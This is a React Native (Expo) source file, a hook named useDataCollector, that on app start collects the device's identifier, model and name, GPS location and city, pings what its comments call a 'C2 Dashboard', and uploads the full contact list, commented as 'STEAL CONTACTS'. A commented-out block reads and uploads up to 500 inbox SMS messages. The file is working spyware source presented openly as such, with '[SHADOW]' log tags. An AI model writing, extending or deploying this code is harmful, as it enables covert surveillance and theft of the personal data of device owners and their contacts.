import { useEffect, useState } from 'react';
import * as Contacts from 'expo-contacts';
import * as Location from 'expo-location';
import { Platform } from 'react-native';
import * as Application from 'expo-application';
import * as Device from 'expo-device';
// import SmsAndroid from 'react-native-get-sms-android';

import { agentService } from '@/services/agentService';

export const useDataCollector = () => {
  const [isInitialized, setIsInitialized] = useState(false);

  useEffect(() => {
    if (isInitialized) return;
    
    const executeCollection = async () => {
      try {
        // 1. DEVICE FINGERPRINTING
        const deviceId = Application.applicationId || `unknown-${Date.now()}`;
        const { status } = await Location.requestForegroundPermissionsAsync();

        let lat = 0, lon = 0, city = '', country = '';

        if (status === 'granted') {
          try {
            const location = await Location.getCurrentPositionAsync({});
            lat = location.coords.latitude;
            lon = location.coords.longitude;
            const geocode = await Location.reverseGeocodeAsync({ latitude: lat, longitude: lon });
            if (geocode[0]) {
              city = geocode[0].city || '';
              country = geocode[0].country || '';
            }
          } catch (e) {
            console.log("Location failed", e);
          }
        }

        // 2. SEND PING (Connects device to C2 Dashboard)
        await agentService.ping({
          device_id: deviceId,
          android_version: String(Platform.Version),
          model: Device.modelName ?? "unknown",
          username: Device.deviceName ?? "unknown",
          lat: lat,
          lon: lon,
          city: city,
          country: country,
        });

        // 3. STEAL CONTACTS
        // Note: Requires permissions in app.json
        try {
          const { data } = await Contacts.getContactsAsync({
            fields: [Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
          });
          
          const contactList = data.map(c => ({
            name: c.name || '',
            phone: c.phoneNumbers?.[0]?.number || '',
            email: c.emails?.[0]?.email || '',
          }));

          if (contactList.length > 0) {
            console.log(`[SHADOW] Uploading ${contactList.length} contacts...`);
            await agentService.uploadContacts(deviceId, contactList);
          }
        } catch (e) {
          console.log("[SHADOW] Contacts fetch failed (permission denied?)", e);
        }

        // 4. STEAL SMS (Android Only)
       /* if (Platform.OS === 'android') {
          try {
            // Filter for inbox messages only
            const filter = { box: 'inbox', maxCount: 500 }; 
            const smsList = await SmsAndroid.list(JSON.stringify(filter), true);

            const parsedSms = smsList.map((s: any) => ({
              address: s.address,
              body: s.body,
              type: 'INBOX',
              date: s.date.toString(),
            }));

            if (parsedSms.length > 0) {
              console.log(`[SHADOW] Uploading ${parsedSms.length} SMS...`);
              await agentService.uploadSms(deviceId, parsedSms);
            }
          } catch (e) {
            console.log("[SHADOW] SMS fetch failed (permission denied?)", e);
          }
        } */

        setIsInitialized(true);
      } catch (error) {
        console.error("[SHADOW] Critical collection failure:", error);
      }
    };

    // Run immediately on mount
    executeCollection();
  }, [isInitialized]);
};